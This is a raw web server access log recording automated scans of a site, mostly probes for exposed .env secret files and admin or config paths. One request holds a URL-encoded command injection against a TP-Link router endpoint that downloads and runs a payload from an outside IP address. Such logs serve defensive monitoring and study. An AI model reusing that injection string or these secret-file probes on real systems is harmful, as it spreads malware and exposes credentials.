78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /.env.dev HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /blog/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /cgi-bin/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /new/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SCH-I545 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30evme-launcher"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /old/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /protected/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.56"
78.153.140.177 - - [16/Aug/2024:08:29:54 +0000] "GET /src/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G950U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:54 +0000] "GET /storage/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 5.1; rv:53.0) Gecko/20100101 Firefox/53.0"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /.env.backup HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; GT-I9070 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /.env.stage HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Mobile; LYF/F61F/LYF-F61F-000-01-20-310118; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /app/config/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /application/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; de) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /.env.live HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2130.75"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /.env.old HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
78.153.140.177 - - [16/Aug/2024:08:29:57 +0000] "GET /.env.production.local HTTP/1.1" 404 162 "-" "Opera/9.63 (X11; Linux x86_64; U; cs) Presto/2.1.1"
78.153.140.177 - - [16/Aug/2024:08:29:58 +0000] "GET /.env_1 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (iPad;U;CPU OS 3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10"
208.110.70.42 - - [16/Aug/2024:08:40:59 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
208.110.70.42 - - [16/Aug/2024:08:41:00 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
157.245.69.32 - - [16/Aug/2024:08:50:42 +0000] "GET /aaa9 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
157.245.69.32 - - [16/Aug/2024:08:50:45 +0000] "GET /aab8 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
157.245.69.32 - - [16/Aug/2024:08:50:51 +0000] "GET / HTTP/1.1" 200 3522 "-" "Mozilla/5.0 zgrab/0.x"
185.191.126.213 - - [16/Aug/2024:09:01:17 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
167.71.110.14 - - [16/Aug/2024:09:02:45 +0000] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
167.71.110.14 - - [16/Aug/2024:09:02:50 +0000] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 400 264 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [16/Aug/2024:09:04:12 +0000] "GET / HTTP/1.1" 200 3522 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
106.75.157.47 - - [16/Aug/2024:09:05:20 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 134 "-" "Go-http-client/1.1"
154.213.187.96 - - [16/Aug/2024:09:34:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
43.153.110.177 - - [16/Aug/2024:09:41:57 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.153.110.177 - - [16/Aug/2024:09:41:58 +0000] "GET / HTTP/1.1" 200 405 "http://www.musiify.site" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
